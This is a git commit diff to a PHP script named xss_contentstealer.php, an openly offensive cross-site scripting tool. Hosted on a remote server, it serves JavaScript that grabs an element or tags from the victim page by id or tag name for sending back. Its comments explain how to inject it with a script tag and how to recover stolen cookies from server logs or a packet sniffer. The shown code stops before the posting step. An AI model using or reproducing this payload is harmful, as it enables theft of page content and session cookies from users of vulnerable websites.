a8994fb6f68d8aced95cc51d016a6bcc27f321c6
root <root@localhost.localdomain>
2014-05-14 09:59:33 -0400

    Testing round 2...

--- xss_contentstealer.php
+++ xss_contentstealer.php
@@ -1,11 +1,12 @@
 <?php
+  header( "Content-type: text/javascript" );
   // For hosting on a remote web service in order to post back cookies from the injected page
   // Either pull the data out of logs or see the decoded cookie in the response if running a packet sniffer on the host
   $url = "http://".$_SERVER["SERVER_ADDR"].$_SERVER["PHP_SELF"];
   echo "// $url\n";
-  echo "/*\n Inject with:\n <script src=\"".$url."?id=userDiv\"></script>\n or <script src=\"".$url."?tag=ul\"></script>\n";
-  echo " Where id is the id of an element to be grabbed and tag is the name of all tags to be grabbed. Default to body\n*/\n\n";
   if( !isset( $_GET["c"] ) ){
+    echo "/*\n Inject with:\n ".$url."?id=userDiv or ".$url."?tag=ul\n";
+    echo " Where id is the id of an element to be grabbed or tag is the name of all tags to be grabbed. Defaults to tag=body\n*/\n\n";
     if( !empty( $_GET["id"] ) ){
       echo "var content = document.getElementById('".$_GET["id"]."').outerHTML;\n";
     }else{
